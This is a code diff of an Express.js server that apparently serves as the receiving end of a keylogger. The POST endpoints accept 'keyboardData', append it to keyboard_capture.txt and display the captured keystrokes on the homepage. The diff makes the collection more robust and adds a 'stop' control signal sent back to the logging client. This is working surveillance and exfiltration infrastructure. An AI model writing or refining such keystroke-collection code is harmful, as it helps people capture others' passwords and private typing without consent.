@@ -21,32 +21,36 @@ app.get("/", (req, res) => {
     throw an exception and log to the homepage that nothing's been logged yet.   
     */ 
     try {
-        const kl_file = fs.readFileSync("./keyboard_capture.txt", {encoding:'utf8', flag:'r'});    
-        // We send the txt file data to the server. We replace the "\n" with <br> 
-        res.send(`<h1>Logged data</h1><p>${kl_file.replace("\n", "<br>")}</p>`);
-    } catch {
+        const kl_file = fs.readFileSync("./keyboard_capture.txt", { encoding: 'utf8', flag: 'r' });
+        res.send(`<h1>Logged data</h1><p>${kl_file.replace(/\n/g, "<br>")}</p>`); // Replace all newlines with <br>
+    } catch (error) {
+        console.error("Error reading file:", error);
         res.send("<h1>Nothing logged yet.</h1>");
     }  
 });
 
 
 app.post("/", (req, res) => {
-    // For demo purposes we log the keyboardData sent as part of the body of the POST request to the server.
-    console.log(req.body.keyboardData);
-    // Will now write the keyboard capture to a text file.
-    fs.writeFileSync("keyboard_capture.txt", req.body.keyboardData);
-    res.send("Successfully set the data");
+    try {
+        const data = req.body.keyboardData + "\n"; // Ensure newline for consistency
+        fs.appendFileSync("keyboard_capture.txt", data); // Append instead of overwriting
+        console.log("Data logged:", req.body.keyboardData);
+        res.send("Successfully logged the data.");
+    } catch (error) {
+        console.error("Error writing to file:", error);
+        res.status(500).send("Failed to log data.");
+    }
 });
 
-// Add a new POST endpoint for /api/keystrokes
 app.post("/api/keystrokes", (req, res) => {
     try {
-        // Append the keyboard data to the file instead of overwriting
-        fs.appendFileSync("keyboard_capture.txt", req.body.keyboardData + "\n");
-        res.status(200).send("Keystrokes logged successfully.");
+        const data = req.body.keyboardData + "\n"; // Ensure newline for consistency
+        fs.appendFileSync("keyboard_capture.txt", data); // Append instead of overwriting
+        console.log("Data logged:", req.body.keyboardData);
+        res.json({ message: "Successfully logged the data.", stop: false }); // Include stop signal
     } catch (error) {
-        console.error("Error logging keystrokes:", error);
-        res.status(500).send("Failed to log keystrokes.");
+        console.error("Error writing to file:", error);
+        res.status(500).json({ message: "Failed to log data." });
     }
 });
 
